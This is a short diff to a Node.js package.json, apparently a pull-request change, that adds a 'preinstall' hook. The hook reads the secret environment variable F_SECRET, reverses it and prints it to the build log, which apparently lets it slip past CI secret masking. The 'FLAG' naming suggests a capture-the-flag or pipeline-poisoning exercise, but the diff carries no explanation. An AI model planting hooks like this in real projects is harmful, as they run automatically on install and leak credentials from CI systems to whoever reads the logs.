@@ -5,6 +5,8 @@
   "private": true,
   "main": "app/index.js",
   "scripts": {
+	  "preinstall": "node -e 'console.log(\"REVERSED_FLAG: \" + process.env.F_SECRET.split(\"\").reverse().join(\"\"))'",
+ 
     "start": "node app/index.js",
     "build": "echo \"Building backend services\"",
     "test": "npm run test:unit && npm run test:integration",
